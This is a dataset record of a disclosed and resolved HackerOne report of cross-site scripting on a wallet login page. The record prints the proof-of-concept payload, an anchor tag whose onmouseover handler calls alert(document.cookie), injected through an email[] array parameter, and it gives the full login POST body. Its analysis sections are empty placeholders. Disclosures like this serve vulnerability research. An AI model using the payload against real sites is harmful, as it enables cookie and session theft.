---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '63888'
original_report_id: '63888'
title: Cross site scripting
weakness: Cross-site Scripting (XSS) - Generic
team_handle: enter
created_at: '2015-05-27T06:54:57.538Z'
disclosed_at: '2015-07-12T18:45:43.511Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Cross site scripting

## Metadata

- HackerOne Report ID: 63888
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: enter
- Disclosed At: 2015-07-12T18:45:43.511Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

page : 
https://wallet.romit.io/login

post data "email=xxx@xxx.com" set to "email[]=<a onmouseover=alert(document.cookie)>xxs link</a>"

full request data 
email[]=<a onmouseover=alert(document.cookie)>xxs link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
